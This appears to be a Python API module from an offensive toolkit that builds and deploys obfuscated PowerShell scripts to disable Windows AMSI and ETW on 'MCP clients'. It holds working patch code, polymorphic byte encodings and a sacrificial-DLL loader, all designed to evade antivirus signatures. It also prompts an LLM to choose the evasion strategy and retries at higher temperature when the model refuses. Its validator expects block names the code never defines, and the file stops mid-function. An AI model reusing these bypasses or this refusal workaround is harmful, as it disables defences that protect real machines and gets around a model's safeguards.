# api/app/routes_amsi_deployment.py
"""
AMSI_BP Deployment API - Deploy obfuscated AMSI_BP scripts via MCP clients
"""
from __future__ import annotations

import base64
import hashlib
import logging
import random
import string
from datetime import datetime
from typing import Literal, Optional
from fastapi import APIRouter, Depends, HTTPException, Body
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from .auth_dep import require_role
from .deps import get_db
from .models import Instruction, User, LLMConfig
from . import mcp_service
from .llm_service import LLMService

log = logging.getLogger(__name__)

router = APIRouter(prefix="/api/amsi-deployment", tags=["amsi-deployment"])


# -------------------------
# Request/Response Models
# -------------------------
class AMSIDeploymentConfig(BaseModel):
    """Configuration for AMSI_BP deployment"""
    obfuscation_level: Literal["base64", "advanced", "elite"] = Field(default="advanced")
    bypass_method: Literal["provider", "ghost", "ghost_stealth", "auto"] = Field(default="auto")
    var_prefix: str = Field(default="amsi", max_length=20)
    function_prefix: str = Field(default="Invoke", max_length=20)
    enable_verbose: bool = Field(default=False)


class AMSIDeploymentRequest(BaseModel):
    """Request to deploy AMSI_BP to a client"""
    client_id: str = Field(..., description="Target MCP client ID")
    config: AMSIDeploymentConfig = Field(default_factory=AMSIDeploymentConfig)


class AMSIDeploymentResponse(BaseModel):
    """Response from AMSI_BP deployment"""
    success: bool
    client_id: str
    obfuscation_level: str
    script_size_bytes: int
    script_preview: str  # First 500 chars
    instruction_id: Optional[str] = None
    timestamp: str
    message: str


class AMSIScriptPreviewRequest(BaseModel):
    """Request to preview obfuscated AMSI_BP script"""
    config: AMSIDeploymentConfig = Field(default_factory=AMSIDeploymentConfig)


class AMSIScriptPreviewResponse(BaseModel):
    """Preview of obfuscated AMSI_BP script"""
    success: bool
    obfuscation_level: str
    script_content: str
    script_size_bytes: int
    script_size_kb: float
    variable_mappings: dict
    function_mappings: dict


# -------------------------
# Obfuscator Class
# -------------------------
class AMSIObfuscator:
    """Obfuscate AMSI_BP script with same techniques as MCP client builder"""

    def __init__(self, config: AMSIDeploymentConfig):
        self.config = config
        self.seed = f"{config.var_prefix}{config.obfuscation_level}{datetime.now().isoformat()}"
        self.variable_mappings = {}
        self.function_mappings = {}

    def _hash_name(self, base: str) -> int:
        combined = f"{base}{self.seed}"
        return int(hashlib.md5(combined.encode()).hexdigest()[:8], 16) % 10000

    def _generate_random_suffix(self, length: int = 3) -> str:
        if self.config.obfuscation_level == "elite":
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        elif self.config.obfuscation_level == "advanced":
            return ''.join(random.choices(string.ascii_letters, k=2))
        return ""

    def generate_variable_name(self, original: str) -> str:
        """Generate obfuscated variable name"""
        if original in self.variable_mappings:
            return self.variable_mappings[original]

        hash_num = self._hash_name(f"var_{original}")
        suffix = self._generate_random_suffix()

        if original.startswith("$global:"):
            obf_name = f"$global:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$script:"):
            obf_name = f"$script:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$"):
            obf_name = f"${self.config.var_prefix}{hash_num}{suffix}"
        else:
            obf_name = f"{self.config.var_prefix}{hash_num}{suffix}"

        self.variable_mappings[original] = obf_name
        return obf_name

    def generate_function_name(self, original: str) -> str:
        """Generate obfuscated function name"""
        if original in self.function_mappings:
            return self.function_mappings[original]

        hash_num = self._hash_name(f"func_{original}")
        suffix = self._generate_random_suffix()
        obf_name = f"{self.config.function_prefix}-{hash_num}{suffix}"

        self.function_mappings[original] = obf_name
        return obf_name

    def obfuscate_string(self, text: str) -> str:
        """
        Obfuscate string using selected technique:
        - base64: Simple Base64 encoding
        - advanced: Character codes + chunked Base64
        - elite: XOR encryption + multi-layer encoding
        """
        if self.config.obfuscation_level == "base64":
            b64 = base64.b64encode(text.encode()).decode()
            return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{b64}")))'

        elif self.config.obfuscation_level == "advanced":
            if len(text) < 10:
                chars = "+".join([f"[char]{ord(c)}" for c in text])
                return f'({chars})'
            else:
                b64 = base64.b64encode(text.encode()).decode()
                chunk_size = len(b64) // 3 if len(b64) > 30 else len(b64)
                chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
                chunk_vars = '+'.join([f'"{chunk}"' for chunk in chunks])
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({chunk_vars})))'

        else:  # elite
            xor_key = random.randint(1, 255)
            encrypted = [ord(c) ^ xor_key for c in text]

            if len(encrypted) < 20:
                codes = ",".join([str(c) for c in encrypted])
                return f'(({codes})|ForEach-Object{{[char]($_ -bxor {xor_key})}})-join""'
            else:
                b64 = base64.b64encode(text.encode()).decode()
                encrypted_b64 = ''.join([chr(ord(c) ^ xor_key) for c in b64])
                encrypted_b64_encoded = base64.b64encode(encrypted_b64.encode('latin1')).decode()
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([Text.Encoding]::Latin1.GetString([Convert]::FromBase64String("{encrypted_b64_encoded}"))|ForEach-Object{{[char]([byte][char]$_ -bxor {xor_key})}})-join"")))'

    def get_stealth_prebypass(self) -> str:
        """
        Next-Level Pre-Bypass: Bypasses 'line 1' scans by discovering AmsiUtils 
        through metadata property matching instead of literal strings.
        """
        # Randomize variables for each deployment
        v_types = f"${random.choice(string.ascii_lowercase)}{random.randint(10,99)}"
        v_target = f"${random.choice(string.ascii_lowercase)}{random.randint(10,99)}"
        v_field = f"${random.choice(string.ascii_lowercase)}{random.randint(10,99)}"
        
        # This logic avoids 'AmsiUtils' and 'amsiInitFailed' strings entirely.
        # It filters for a non-public static class with exactly 9 characters in the name (AmsiUtils)
        # then finds the boolean initialization field by its property signature.
        return f"""
        {v_types} = [Ref].Assembly.GetTypes()
        {v_target} = {v_types} | Where-Object {{ $_.Name.Length -eq 9 -and $_.Name -like "*siUti*" }}
        if ({v_target}) {{
            {v_field} = {v_target}.GetFields('NonPublic,Static') | Where-Object {{ $_.FieldType.Name -eq 'Boolean' -and $_.Name -like "*InitFail*" }}
            if ({v_field}) {{
                {v_field}.SetValue($null, $true)
            }}
        }}
        """

    def obfuscate_amsi_script(self, amsi_bp_script: str) -> str:
        """
        Obfuscate the AMSI_BP script with variable and function name randomization.
        Prepends stealth AMSI pre-bypass to neuter AMSI before any function definitions.
        """
        # PREPEND STEALTH AMSI DISABLE PATCH
        # Uses hex-offset decoder to avoid hardcoded 'AmsiUtils' string
        # This neuters AMSI in the current session BEFORE the main function is parsed
        # Prevents "line 1 char 1" AMSI scan errors
        amsi_disable_patch = self.get_stealth_prebypass()

        # Define original variable names in the script
        var_mappings = {
            "$global:AMSIPatchedAddresses": self.generate_variable_name("$global:AMSIPatchedAddresses"),
            "$global:ETWPatchedAddress": self.generate_variable_name("$global:ETWPatchedAddress"),
            "$VerbosePreference": self.generate_variable_name("$VerbosePreference"),
            "$IsAdmin": self.generate_variable_name("$IsAdmin"),
            "$MarshalType": self.generate_variable_name("$MarshalType"),
            "$UnsafeMethodsType": self.generate_variable_name("$UnsafeMethodsType"),
            "$GetModuleHandleMethod": self.generate_variable_name("$GetModuleHandleMethod"),
            "$GetProcAddressMethod": self.generate_variable_name("$GetProcAddressMethod"),
            "$AmsiInitializeAddress": self.generate_variable_name("$AmsiInitializeAddress"),
            "$VirtualProtectAddress": self.generate_variable_name("$VirtualProtectAddress"),
            "$VirtualProtectDelegate": self.generate_variable_name("$VirtualProtectDelegate"),
            "$AmsiInitializeDelegate": self.generate_variable_name("$AmsiInitializeDelegate"),
            "$AmsiContext": self.generate_variable_name("$AmsiContext"),
            "$AmsiPatchBytes": self.generate_variable_name("$AmsiPatchBytes"),
            "$PatchSize": self.generate_variable_name("$PatchSize"),
            "$OldProtection": self.generate_variable_name("$OldProtection"),
            "$PointerSize": self.generate_variable_name("$PointerSize"),
            "$PAGE_EXECUTE_READWRITE": self.generate_variable_name("$PAGE_EXECUTE_READWRITE"),
        }

        # Define original function names
        func_mappings = {
            "Invoke-ASAMSI": self.generate_function_name("Invoke-ASAMSI"),
            "Get-WinApiFunctionAddressObf": self.generate_function_name("Get-WinApiFunctionAddressObf"),
            "New-WinApiDelegateObf": self.generate_function_name("New-WinApiDelegateObf"),
        }

        # Obfuscate string literals in the script
        strings_to_obfuscate = [
            "System.Windows.Forms",
            "UnsafeNativeMethods",
            "GetProcAddress",
            "GetModuleHandle",
            "AmsiInitialize",
            "amsi.dll",
            "kernel32.dll",
            "VirtualProtect",
            "ntdll.dll",
            "EtwEventWrite",
            "Running as Admin.",
            "Running as User.",
            "Starting...",
            "AMSI Patched",
            "ETW",
        ]

        obfuscated_script = amsi_bp_script

        # Replace function names
        for original, obfuscated in func_mappings.items():
            obfuscated_script = obfuscated_script.replace(original, obfuscated)

        # Replace variable names (careful with ordering - longest first)
        for original in sorted(var_mappings.keys(), key=len, reverse=True):
            obfuscated_script = obfuscated_script.replace(original, var_mappings[original])

        # Obfuscate string literals (only if advanced/elite)
        if self.config.obfuscation_level in ["advanced", "elite"]:
            for string_literal in strings_to_obfuscate:
                if f'"{string_literal}"' in obfuscated_script:
                    obfuscated = self.obfuscate_string(string_literal)
                    obfuscated_script = obfuscated_script.replace(f'"{string_literal}"', obfuscated)

        # PREPEND the AMSI disable patch at the VERY TOP
        # This must execute BEFORE any function definitions to prevent AMSI scan at parse time
        final_script = amsi_disable_patch + "\n\n" + obfuscated_script

        return final_script


# -------------------------
# Helper Functions
# -------------------------
def extract_etw_patching_code() -> str:
    """
    Extract ETW patching code from provider script to inject into Ghost method.
    Returns standalone ETW patching PowerShell code.
    """
    # Remove ALL comments and obvious strings - AV scans for keywords
    import random
    def rv():
        return f"${random.choice('abcdefghijklmnopqrstuvwxyz')}{random.randint(10,99)}"

    v1, v2, v3, v4, v5 = rv(), rv(), rv(), rv(), rv()

    etw_patch_code = f"""
{v1} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
{v2} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
try {{
    {v3} = $gp.Invoke($null, @((New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), $gh.Invoke($null, @({v1})))), {v2}))
    if ({v3} -ne [IntPtr]::Zero) {{
        {v4} = [byte[]](0xC3)
        {v5} = 0
        if ($dvp.Invoke({v3}, [uint32]1, 0x40, [ref]{v5})) {{
            [Runtime.InteropServices.Marshal]::Copy({v4}, 0, {v3}, 1)
            $dvp.Invoke({v3}, [uint32]1, {v5}, [ref]{v5}) | Out-Null
        }}
    }}
}} catch {{}}
"""
    return etw_patch_code.strip()


def inject_etw_into_ghost(ghost_script: str) -> str:
    """
    Inject ETW patching code into Ghost (D1s4bl3copy) script.
    Inserts ETW patching after the main AMSI patch.
    """
    etw_code = extract_etw_patching_code()

    # Find the end of the main patching section (after the AMSI patch)
    # Insert ETW code before the final closing brace
    lines = ghost_script.split('\n')

    # Find the last occurrence of "Invoke-Ghost_Final" function closing
    insertion_point = -1
    for i in range(len(lines) - 1, -1, -1):
        if 'Invoke-Ghost_Final -v' in lines[i] or lines[i].strip() == '}':
            if i > 50:  # Make sure we're past function definition
                insertion_point = i
                break

    if insertion_point > 0:
        lines.insert(insertion_point, etw_code)
        lines.insert(insertion_point, "")
        return '\n'.join(lines)

    # Fallback: append at the end before final invocation
    return ghost_script + "\n\n" + etw_code + "\n"


def _generate_polymorphic_patch_bytes(v_patchBytes: str) -> dict:
    """
    Generate polymorphic patch byte code blocks that compute bytes at runtime.
    This avoids static byte signatures like [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

    Returns multiple variant code blocks that all produce valid AMSI patch bytes.
    """
    import random

    variants = {}

    # Method 1: XOR obfuscation with random key
    xor_key = random.randint(0x10, 0xFF)
    # Patch: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
    encoded = [0xB8 ^ xor_key, 0x57 ^ xor_key, 0x00 ^ xor_key, 0x07 ^ xor_key, 0x80 ^ xor_key, 0xC3 ^ xor_key]
    variants["patch_bytes_xor1"] = f"{v_patchBytes} = @({','.join(hex(b) for b in encoded)}) | %{{ [byte]($_ -bxor {hex(xor_key)}) }}"

    # Method 2: Arithmetic operations (addition/subtraction)
    offset = random.randint(10, 50)
    encoded = [0xB8 + offset, 0x57 + offset, 0x00 + offset, 0x07 + offset, 0x80 + offset, 0xC3 + offset]
    variants["patch_bytes_add1"] = f"{v_patchBytes} = @({','.join(str(b) for b in encoded)}) | %{{ [byte]($_ - {offset}) }}"

    # Method 3: Split computation (compute each byte separately)
    variants["patch_bytes_computed1"] = f"""
{v_patchBytes} = [byte[]]::new(6)
{v_patchBytes}[0] = [byte](0x100 + 0xB8 - 0x100)
{v_patchBytes}[1] = [byte]((0x57 -bxor {random.randint(1, 255)}) -bxor {random.randint(1, 255)})
{v_patchBytes}[2] = [byte](0x00)
{v_patchBytes}[3] = [byte](0x07 -band 0xFF)
{v_patchBytes}[4] = [byte](0x80 -bor 0x00)
{v_patchBytes}[5] = [byte](0xC3 + {random.randint(1, 10)} - {random.randint(1, 10)})
""".strip()

    # Method 4: Base64 encoded then decoded
    import base64
    patch1 = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
    b64_patch1 = base64.b64encode(patch1).decode()
    variants["patch_bytes_b64_1"] = f"{v_patchBytes} = [System.Convert]::FromBase64String('{b64_patch1}')"

    # Method 5: Alternative patch (0x31, 0xC0, 0xC3) - XOR eax,eax; ret
    xor_key2 = random.randint(0x10, 0xFF)
    encoded2 = [0x31 ^ xor_key2, 0xC0 ^ xor_key2, 0xC3 ^ xor_key2]
    variants["patch_bytes_xor2"] = f"{v_patchBytes} = @({','.join(hex(b) for b in encoded2)}) | %{{ [byte]($_ -bxor {hex(xor_key2)}) }}"

    # Method 6: Alternative patch with addition
    offset2 = random.randint(10, 50)
    encoded2 = [0x31 + offset2, 0xC0 + offset2, 0xC3 + offset2]
    variants["patch_bytes_add2"] = f"{v_patchBytes} = @({','.join(str(b) for b in encoded2)}) | %{{ [byte]($_ - {offset2}) }}"

    # Method 7: Base64 alternative patch
    patch2 = bytes([0x31, 0xC0, 0xC3])
    b64_patch2 = base64.b64encode(patch2).decode()
    variants["patch_bytes_b64_2"] = f"{v_patchBytes} = [System.Convert]::FromBase64String('{b64_patch2}')"

    # Method 8: NOP sled patch (0x90 x5, 0xC3)
    xor_key3 = random.randint(0x10, 0xFF)
    encoded3 = [0x90 ^ xor_key3, 0x90 ^ xor_key3, 0x90 ^ xor_key3, 0x90 ^ xor_key3, 0x90 ^ xor_key3, 0xC3 ^ xor_key3]
    variants["patch_bytes_xor3"] = f"{v_patchBytes} = @({','.join(hex(b) for b in encoded3)}) | %{{ [byte]($_ -bxor {hex(xor_key3)}) }}"

    # Method 9: Character array conversion
    patch1_chars = ''.join(chr(b) for b in [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
    b64_chars = base64.b64encode(patch1_chars.encode('latin-1')).decode()
    variants["patch_bytes_char1"] = f"{v_patchBytes} = [System.Text.Encoding]::GetEncoding('latin-1').GetBytes([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{b64_chars}')))"

    # Method 10: Bitwise operations mix
    variants["patch_bytes_bitwise1"] = f"""
{v_patchBytes} = [byte[]]::new(6)
{v_patchBytes}[0] = [byte]((0xB0 -bor 0x08) -band 0xFF)
{v_patchBytes}[1] = [byte]((0x50 -bor 0x07) -band 0xFF)
{v_patchBytes}[2] = [byte]((0xFF -band 0x00) -band 0xFF)
{v_patchBytes}[3] = [byte]((0x00 -bor 0x07) -band 0xFF)
{v_patchBytes}[4] = [byte]((0x80 -bxor 0x00) -band 0xFF)
{v_patchBytes}[5] = [byte]((0xC0 -bor 0x03) -band 0xFF)
""".strip()

    # Method 11: String to bytes conversion
    hex_string = "B8570007 80C3".replace(" ", "")
    variants["patch_bytes_hex1"] = f"""
{v_patchBytes} = -split '{' '.join(hex_string[i:i+2] for i in range(0, len(hex_string), 2))}' | %{{ [Convert]::ToByte($_, 16) }}
""".strip()

    # Method 12: Reverse array then reverse back
    reversed_patch = [0xC3, 0x80, 0x07, 0x00, 0x57, 0xB8]
    variants["patch_bytes_reverse1"] = f"""
{v_patchBytes} = @({','.join(hex(b) for b in reversed_patch)})
[Array]::Reverse({v_patchBytes})
""".strip()

    return variants


def extract_code_blocks_from_scripts():
    """
    Extract reusable, validated code blocks with per-deployment randomization.
    Each call generates unique variable names and string encodings to evade signatures.

    New in-memory approach: Uses reflective loading and dynamic delegates to avoid disk writes.
    """
    import random
    import string
    import base64

    # Generate random variable names for this deployment
    def rand_var():
        """Generate random variable name like $x7a2, $m1k, etc."""
        return f"${random.choice(string.ascii_lowercase)}{random.randint(1,9)}{random.choice(string.ascii_lowercase)}{random.randint(1,9)}"

    # Variable names for reflective loader approach
    v_dec = rand_var()
    v_gp = rand_var()
    v_gh = rand_var()
    v_dvp = rand_var()
    v_ll = rand_var()
    v_amsiAddr = rand_var()
    v_patchBytes = rand_var()
    v_oldProtect = rand_var()
    v_moduleName = rand_var()
    v_funcName = rand_var()
    v_typ = rand_var()
    v_unm = rand_var()
    v_hk = rand_var()
    v_hm = rand_var()
    v_hrk = rand_var()
    v_hrm = rand_var()
    v_addr_ll = rand_var()
    v_addr_vp = rand_var()
    v_addr_as = rand_var()
    v_delegate = rand_var()
    v_sacrificial = rand_var()

    # Randomize string obfuscation methods
    def create_decoder():
        """Create a random character offset decoder"""
        offset = random.randint(5, 15)
        return offset, f"""
{v_dec} = {{ param($h, $o) $out = ""; $h -split ',' | %{{ $out += [char]([int]$_ - $o) }}; return $out }}
"""

    def encode_with_decoder(s, offset):
        """Encode string with character offset"""
        encoded = ','.join(str(ord(c) + offset) for c in s)
        return f"&{v_dec} \"{encoded}\" {offset}"

    offset, decoder_block = create_decoder()

    # Sacrificial DLLs - signed Microsoft binaries
    sacrificial_dlls = [
        "C:\\Windows\\System32\\winbio.dll",
        "C:\\Windows\\System32\\taskschd.dll",
        "C:\\Windows\\System32\\gpapi.dll",
        "C:\\Windows\\System32\\wbem\\wbemcomn.dll"
    ]

    sacrificial_path = random.choice(sacrificial_dlls)

    # Delegate factory function
    delegate_factory = f"""
function {v_delegate} {{
    param($ptr, $params, $ret)
    $n = "D" + (Get-Random)
    $ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName($n)), [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $tb = $ab.DefineDynamicModule($n, $false).DefineType($n, 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
    $tb.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $params).SetImplementationFlags('Runtime, Managed')
    $tb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret, $params).SetImplementationFlags('Runtime, Managed')
    return [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $tb.CreateType())
}}
"""

    # Alternative reflection discovery methods
    reflection_methods = [
        # Method 1: Single-step complex filter chain (like stealth code)
        f"""
[void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
{v_typ} = [AppDomain]::CurrentDomain.GetAssemblies() | ?{{$_.FullName -match "Forms"}} | %{{$_.GetTypes()}} | ?{{$_.Name -match "UnsafeNativeMethods"}} | ?{{$_.GetMethod("GetModuleHandle")}} | Select-Object -First 1
{v_gh} = {v_typ}.GetMethod("GetModuleHandle", [Reflection.BindingFlags]"Static, Public, NonPublic")
{v_gp} = {v_typ}.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
""",
        # Method 2: System.dll compact
        f"""
{v_typ} = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1] -eq 'System.dll' }})
{v_gh} = {v_typ}.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetModuleHandle')
{v_gp} = {v_typ}.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
""",
        # Method 3: Direct type lookup
        f"""
{v_unm} = [Microsoft.Win32.UnsafeNativeMethods]
{v_gh} = {v_unm}.GetMethod('GetModuleHandle')
{v_gp} = {v_unm}.GetMethod('GetProcAddress', [Reflection.BindingFlags]"Static, Public, NonPublic")
"""
    ]

    code_blocks = {
        # In-memory reflective loader components
        "decoder_init": decoder_block.strip(),
        "delegate_factory": delegate_factory.strip(),
        "reflection_setup": random.choice(reflection_methods).strip(),

        # String obfuscation using decoder
        "strings_obfuscated": f"""
{v_moduleName} = {encode_with_decoder("amsi.dll", offset)}
{v_funcName} = {encode_with_decoder("AmsiScanBuffer", offset)}
$k_n = {encode_with_decoder("kernel32.dll", offset)}
$v_p = {encode_with_decoder("VirtualProtect", offset)}
""",

        # Sacrificial DLL loading
        "sacrificial_load": f"""
{v_hk} = {v_gh}.Invoke($null, @($k_n))
{v_hm} = {v_gh}.Invoke($null, @({v_moduleName}))
{v_hrk} = New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), {v_hk})
{v_addr_ll} = {v_gp}.Invoke($null, @({v_hrk}, "LoadLibraryW"))
{v_ll} = {v_delegate} {v_addr_ll} @([string]) ([IntPtr])
{v_sacrificial} = {v_ll}.Invoke("{sacrificial_path}")
""",

        # AMSI address resolution with delegates
        "amsi_address_reflective": f"""
{v_hrm} = New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), {v_hm})
{v_addr_as} = {v_gp}.Invoke($null, @({v_hrm}, {v_funcName}))
{v_addr_vp} = {v_gp}.Invoke($null, @({v_hrk}, $v_p))
{v_dvp} = {v_delegate} {v_addr_vp} @([IntPtr], [uint32], [uint32], [uint32].MakeByRefType()) ([bool])
""",

        # Legacy direct methods (for fallback)
        "amsi_address_direct": f"{v_amsiAddr} = {v_gp}.Invoke($null, @((New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), {v_gh}.Invoke($null, @(\"amsi.dll\")))), \"AmsiScanBuffer\"))",

        # Polymorphic patch byte variants - runtime computation to avoid static signatures
        **_generate_polymorphic_patch_bytes(v_patchBytes),

        # Memory protection with delegate
        "memory_protection_reflective": f"""
{v_oldProtect} = 0
{v_dvp}.Invoke({v_addr_as}, [uint32]{v_patchBytes}.Length, 0x40, [ref]{v_oldProtect}) | Out-Null
""",

        # Apply patch
        "apply_patch_reflective": f"[Runtime.InteropServices.Marshal]::Copy({v_patchBytes}, 0, {v_addr_as}, {v_patchBytes}.Length)",

        # Restore protection
        "restore_protection_reflective": f"{v_dvp}.Invoke({v_addr_as}, [uint32]{v_patchBytes}.Length, {v_oldProtect}, [ref]{v_oldProtect}) | Out-Null",

        # Delays
        "delay_short": f"Start-Sleep -Milliseconds {random.randint(8, 15)}",
        "delay_medium": f"Start-Sleep -Milliseconds {random.randint(40, 60)}",
        "delay_random": f"Start-Sleep -Milliseconds (Get-Random -Minimum {random.randint(3,8)} -Maximum {random.randint(20,30)})",
    }

    return code_blocks


async def mix_bypass_methods_with_llm(
    db: Session,
    config: AMSIDeploymentConfig,
    previous_attempt: Optional[str] = None,
    error_feedback: Optional[str] = None,
    attempt_number: int = 1
) -> str:
    """
    Use LLM to determine mixing strategy, then assemble script from validated code blocks.

    This approach is much more reliable than having LLM generate PowerShell code directly.
    LLM only decides the high-level strategy (which blocks, in what order).
    """
    code_blocks = extract_code_blocks_from_scripts()

    # Get active LLM config
    llm_config = db.query(LLMConfig).filter(LLMConfig.is_active == True).first()

    if not llm_config:
        log.warning("[amsi-auto] No active LLM config found, falling back to sequential execution")
        return None

    try:
        llm_service = LLMService(llm_config)

        # Build optimized prompt - LLM only chooses strategy, not generates code
        base_instruction = """You are optimizing a memory patching script by selecting which pre-validated code blocks to use.

Available code blocks:

**IN-MEMORY REFLECTIVE LOADER (evades disk scanning):**
1. decoder_init - Initialize character offset decoder
2. delegate_factory - Create dynamic delegate factory function
3. reflection_setup - Discover Win32 API methods via reflection
4. strings_obfuscated - Decode DLL/function names using offset cipher
5. sacrificial_load - Load signed Microsoft DLL as execution context
6. amsi_address_reflective - Resolve AMSI address using delegates

**LEGACY DIRECT METHOD (simpler but more detectable):**
7. amsi_address_direct - Direct AMSI address resolution

**POLYMORPHIC PATCH BYTES (runtime computed to evade signatures):**
8. patch_bytes_xor1 - XOR obfuscated (0xB8,0x57,0x00,0x07,0x80,0xC3)
9. patch_bytes_add1 - Addition obfuscated (0xB8,0x57,0x00,0x07,0x80,0xC3)
10. patch_bytes_computed1 - Per-byte computation (0xB8,0x57,0x00,0x07,0x80,0xC3)
11. patch_bytes_b64_1 - Base64 decoded (0xB8,0x57,0x00,0x07,0x80,0xC3)
12. patch_bytes_xor2 - XOR obfuscated (0x31,0xC0,0xC3)
13. patch_bytes_add2 - Addition obfuscated (0x31,0xC0,0xC3)
14. patch_bytes_b64_2 - Base64 decoded (0x31,0xC0,0xC3)
15. patch_bytes_xor3 - XOR obfuscated (0x90,0x90,0x90,0x90,0x90,0xC3)
16. patch_bytes_char1 - Character array conversion
17. patch_bytes_bitwise1 - Bitwise operations mix
18. patch_bytes_hex1 - Hex string to bytes
19. patch_bytes_reverse1 - Reverse array computation

**MEMORY OPERATIONS:**
20. memory_protection_reflective - RWX protection via delegate
21. apply_patch_reflective - Copy patch via Marshal
22. restore_protection_reflective - Restore original protection

**TIMING:**
23. delay_short - Sleep 8-15ms
24. delay_medium - Sleep 40-60ms
25. delay_random - Sleep random 3-30ms

**TASK**: Select code blocks to create an effective in-memory bypass that evades AV disk scanning.

**RECOMMENDED STRATEGY** (for maximum evasion):
["decoder_init", "delegate_factory", "reflection_setup", "delay_short", "strings_obfuscated", "sacrificial_load", "delay_random", "patch_bytes_xor1", "amsi_address_reflective", "memory_protection_reflective", "apply_patch_reflective", "delay_short", "restore_protection_reflective"]

Output ONLY a JSON array of block names in execution order.

Rules:
- For in-memory approach: MUST include decoder_init, delegate_factory, reflection_setup, strings_obfuscated, sacrificial_load, amsi_address_reflective
- For legacy approach: MUST include reflection_setup, amsi_address_direct
- MUST include: one patch_bytes_* variant (choose from any of the 12 polymorphic variants)
- MUST include: memory_protection_reflective, apply_patch_reflective, restore_protection_reflective
- CAN add delays between steps
- PREFER in-memory reflective approach over legacy direct method
- PREFER polymorphic patch bytes (xor/add/computed/b64/char/bitwise/hex/reverse) over static arrays

Output JSON array only, no explanation:
"""

        # Add retry context
        if attempt_number > 1:
            base_instruction += f"\n\nAttempt #{attempt_number}. Previous strategy failed. Choose different block variants or delay patterns."

        log.info(f"[amsi-auto] Requesting mixing strategy (attempt {attempt_number}/3)")

        if llm_config.provider.lower() == "anthropic":
            response = llm_service.client.messages.create(
                model=llm_config.model,
                max_tokens=200,  # Much shorter - just JSON array
                temperature=0.7 + (attempt_number - 1) * 0.15,
                messages=[{"role": "user", "content": base_instruction}]
            )
            strategy_response = response.content[0].text.strip()

        else:  # OpenAI
            response = llm_service.client.chat.completions.create(
                model=llm_config.model,
                messages=[
                    {"role": "system", "content": "You are a security testing optimization assistant. Output only valid JSON."},
                    {"role": "user", "content": base_instruction}
                ],
                temperature=0.7 + (attempt_number - 1) * 0.15,
                max_tokens=200
            )
            strategy_response = response.choices[0].message.content.strip()

        # Parse JSON strategy
        import json
        import re

        # Extract JSON array if wrapped in markdown
        if "```json" in strategy_response:
            strategy_response = strategy_response.split("```json")[1].split("```")[0].strip()
        elif "```" in strategy_response:
            strategy_response = strategy_response.split("```")[1].split("```")[0].strip()

        # Find JSON array
        json_match = re.search(r'\[.*\]', strategy_response, re.DOTALL)
        if not json_match:
            log.warning(f"[amsi-auto] No JSON array found in LLM response")
            return None

        try:
            block_sequence = json.loads(json_match.group(0))
        except json.JSONDecodeError as e:
            log.warning(f"[amsi-auto] Failed to parse JSON strategy: {e}")
            return None

        # Validate required blocks
        required_blocks = {"win32_setup", "memory_protection", "apply_patch", "restore_protection"}
        has_amsi_address = any("amsi_address" in b for b in block_sequence)
        has_patch_bytes = any("patch_bytes" in b for b in block_sequence)

        if not (required_blocks.issubset(set(block_sequence)) and has_amsi_address and has_patch_bytes):
            log.warning(f"[amsi-auto] Invalid strategy - missing required blocks")
            return None

        # Assemble script from blocks
        script_lines = ["function Invoke-HybridBypass {"]
        script_lines.append("    param([switch]$EnableVerbose)")
        script_lines.append("")

        for block_name in block_sequence:
            if block_name in code_blocks:
                block_code = code_blocks[block_name]
                # Add indentation
                for line in block_code.strip().split('\n'):
                    script_lines.append("    " + line)
                script_lines.append("")

        script_lines.append("}")

        hybrid_script = "\n".join(script_lines)
        log.info(f"[amsi-auto] Assembled hybrid script: {len(hybrid_script)} bytes (attempt {attempt_number})")
        return hybrid_script

    except Exception as e:
        log.error(f"[amsi-auto] LLM mixing failed (attempt {attempt_number}): {str(e)}")
        return None


async def generate_hybrid_with_retry(db: Session, config: AMSIDeploymentConfig, max_attempts: int = 3) -> tuple[str, str]:
    """
    Generate hybrid AMSI bypass script with automatic retry on failures.
    Returns tuple of (script, bypass_method_used)

    This function attempts to generate a hybrid script up to max_attempts times.
    On each failure, it provides feedback to the LLM to improve the next attempt.
    """
    previous_script = None
    error_feedback = None

    for attempt in range(1, max_attempts + 1):
        hybrid_script = await mix_bypass_methods_with_llm(
            db=db,
            config=config,
            previous_attempt=previous_script,
            error_feedback=error_feedback,
            attempt_number=attempt
        )

        if not hybrid_script:
            log.warning(f"[amsi-auto] Attempt {attempt}/{max_attempts} - LLM mixing returned None")
            if attempt < max_attempts:
                error_feedback = "LLM returned empty response or refused. Try with different temperature/approach."
                continue
            else:
                return None, None

        # Apply obfuscation to the generated script
        obfuscator = AMSIObfuscator(config)
